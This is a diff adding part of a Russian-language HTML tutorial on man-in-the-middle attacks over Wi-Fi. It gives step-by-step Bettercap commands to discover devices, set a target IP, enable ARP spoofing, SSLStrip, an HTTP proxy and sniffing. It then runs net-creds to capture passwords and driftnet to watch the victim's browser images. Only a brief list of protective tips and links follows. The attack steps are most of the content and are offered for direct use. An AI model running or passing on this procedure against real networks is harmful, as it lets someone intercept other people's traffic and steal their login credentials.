@@ -68,3 +68,59 @@ HSTS - это просто кука, которую пользователь д�
 <pre class="hljs" style="display: block; overflow-x: auto; padding: 0.5em; background: rgb(240, 240, 240) none repeat scroll 0% 0%; color: rgb(68, 68, 68);">sudo mkdir /usr/lib/python2.7/dist-packages/scapy && sudo cp -avr /usr/lib/python3/dist-packages/scapy/* /usr/lib/python2.7/dist-packages/scapy</pre>
 Возвращаемся в домашнюю директорию и клонируем репозиторий net-creds.
 <pre class="hljs" style="display: block; overflow-x: auto; padding: 0.5em; background: rgb(240, 240, 240) none repeat scroll 0% 0%; color: rgb(68, 68, 68);">cd ~ && git clone https://github.com/DanMcInerney/net-creds.git</pre>
+
+<p><a name="bettercap"></a></p>
+<h2>Запускаем Bettercap.</h2>
+Собственно, запускаем :-)
+<pre class="hljs" style="display: block; overflow-x: auto; padding: 0.5em; background: rgb(240, 240, 240) none repeat scroll 0% 0%; color: rgb(68, 68, 68);">sudo bettercap -iface [interface]</pre>, где [interface] - имя используемого интерфейса, посмотрите в ifconfig (без скобок).
+Включаем обнаружение устройств в сети:
+<pre class="hljs" style="display: block; overflow-x: auto; padding: 0.5em; background: rgb(240, 240, 240) none repeat scroll 0% 0%; color: rgb(68, 68, 68);">net.probe on</pre>
+Включаем обновление списка устройств:
+<pre class="hljs" style="display: block; overflow-x: auto; padding: 0.5em; background: rgb(240, 240, 240) none repeat scroll 0% 0%; color: rgb(68, 68, 68);">ticker on</pre>
+Выводим на экран полученный список устройств:
+<pre class="hljs" style="display: block; overflow-x: auto; padding: 0.5em; background: rgb(240, 240, 240) none repeat scroll 0% 0%; color: rgb(68, 68, 68);">net.show</pre>
+Выбираем цель и устанавливаем ее:
+<pre class="hljs" style="display: block; overflow-x: auto; padding: 0.5em; background: rgb(240, 240, 240) none repeat scroll 0% 0%; color: rgb(68, 68, 68);">set arp.spoof.targets [ip]</pre>, где [ip] - IP-адрес цели (без скобок)
+Включаем ARP-спуфинг:
+<pre class="hljs" style="display: block; overflow-x: auto; padding: 0.5em; background: rgb(240, 240, 240) none repeat scroll 0% 0%; color: rgb(68, 68, 68);">arp.spoof on</pre>
+Сокращаем количество сообщений, которые будут сыпаться в консоль:
+<pre class="hljs" style="display: block; overflow-x: auto; padding: 0.5em; background: rgb(240, 240, 240) none repeat scroll 0% 0%; color: rgb(68, 68, 68);">set net.sniff.verbose false</pre>
+Включаем SSLStrip:
+<pre class="hljs" style="display: block; overflow-x: auto; padding: 0.5em; background: rgb(240, 240, 240) none repeat scroll 0% 0%; color: rgb(68, 68, 68);">set http.proxy.sslstrip true</pre>
+Включаем прокси:
+<pre class="hljs" style="display: block; overflow-x: auto; padding: 0.5em; background: rgb(240, 240, 240) none repeat scroll 0% 0%; color: rgb(68, 68, 68);">http.proxy on</pre>
+Включаем сниффинг:
+<pre class="hljs" style="display: block; overflow-x: auto; padding: 0.5em; background: rgb(240, 240, 240) none repeat scroll 0% 0%; color: rgb(68, 68, 68);">net.sniff on</pre>
+
+<p><a name="netcreds"></a></p>
+<i>(в другом окне терминала)</i>
+<h2>Запускаем net-creds.</h2>
+Переходим в директорию с net-creds:
+<pre class="hljs" style="display: block; overflow-x: auto; padding: 0.5em; background: rgb(240, 240, 240) none repeat scroll 0% 0%; color: rgb(68, 68, 68);">cd net-creds</pre>
+Запускаем net-creds:
+<pre class="hljs" style="display: block; overflow-x: auto; padding: 0.5em; background: rgb(240, 240, 240) none repeat scroll 0% 0%; color: rgb(68, 68, 68);">sudo python2 net-creds.py</pre> Опционально можно добавить -i [interface], чтобы указать конкретный интерфейс (нужно использовать тот же, что и в Bettercap) (без скобок)<br><br>
+При желании, вы можете запустить driftnet, чтобы видеть картинки, которые сейчас пользователь видит в браузере. Для начала установите его:
+<pre class="hljs" style="display: block; overflow-x: auto; padding: 0.5em; background: rgb(240, 240, 240) none repeat scroll 0% 0%; color: rgb(68, 68, 68);">sudo apt update && sudo apt install driftnet</pre>
+А затем запустите:
+<pre class="hljs" style="display: block; overflow-x: auto; padding: 0.5em; background: rgb(240, 240, 240) none repeat scroll 0% 0%; color: rgb(68, 68, 68);">sudo driftnet -i [interface]</pre>, где [interface] - желаемый интерфейс (нужно использовать тот же, что и в Bettercap) (без скобок)
+
+<p><a name="example"></a></p>
+<h2>Пример перехваченных данных.</h2>
+<i>В работе...</i>
+
+<p><a name="end"></a></p>
+<h2>Подведение итогов. Рекомендации по защите. Полезные ссылки.</h2>
+<h3>Полезные ссылки.</h3>
+<a href="https://kali.tools/?p=3870">Hackware: руководство по использованию Bettercap</a>
+<a href="https://kali.tools/?p=1600">Hackware: руководство по использованию Driftnet</a>
+<a href="https://kali.tools/?p=179">Hackware: руководство по использованию MITMf</a>
+
+<h3>Рекомендации по защите.</h3>
+<ul>
+  <li>Не заходить в свои учетные записи на сайтах в открытых сетях</li>
+  <li>Поддерживать безопасность личной сети Wi-Fi, иначе будет равноценна открытой сети</li>
+  <li>Использовать расширение HTTPS Everywhere (<a href="https://chrome.google.com/webstore/detail/https-everywhere/gcbommkclmclpchllfjekcdonpmejbdp">Chrome Web Store</a> | <a href="https://addons.mozilla.org/en-US/firefox/addon/https-everywhere">Firefox Browser Add-ons</a>)</li>
+</ul>
+
+Итак, мы познакомились с атакой MITM.<br><br>
+<a href="../index">Назад к списку статей...</a>
